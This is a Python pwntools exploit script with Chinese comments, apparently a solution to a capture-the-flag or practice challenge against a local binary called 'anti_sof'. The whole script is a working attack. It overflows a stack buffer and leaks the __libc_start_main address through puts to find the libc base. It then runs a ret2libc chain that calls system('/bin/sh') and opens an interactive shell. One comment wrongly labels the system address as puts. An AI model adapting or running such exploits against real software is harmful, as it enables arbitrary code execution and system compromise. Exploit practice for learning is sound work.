# -*- coding: utf-8 -*
from pwn import *

p = process('./anti_sof') # 运行程序
p.recvuntil("：") # 当遇到'：'停止接收

# 获取基址
buf = '1' * 28
buf += p32(0x08048360) # puts函数入口地址
buf += p32(0x080484E1) # main函数入口地址
buf += p32(0x0804A018) # __libc_start_main在GOT中的地址
p.sendline(buf)
p.recvuntil('\n') 

libc_start_main_addr_str = p.recv(4) # __libc_start_main的地址
libc_start_main_addr = u32(libc_start_main_addr_str) # 转为int
libc_base = libc_start_main_addr - 0x00018E30

# ret2libc
system_addr = libc_base + 0x0003CE10 # puts函数入口地址
bin_sh_addr = libc_base + 0x0017B88F # "/bin/sh"所在地址

buf = '1' * 28
buf += p32(system_addr)
buf += p32(system_addr) # 任意地址
buf += p32(bin_sh_addr)
p.sendline(buf)

p.interactive()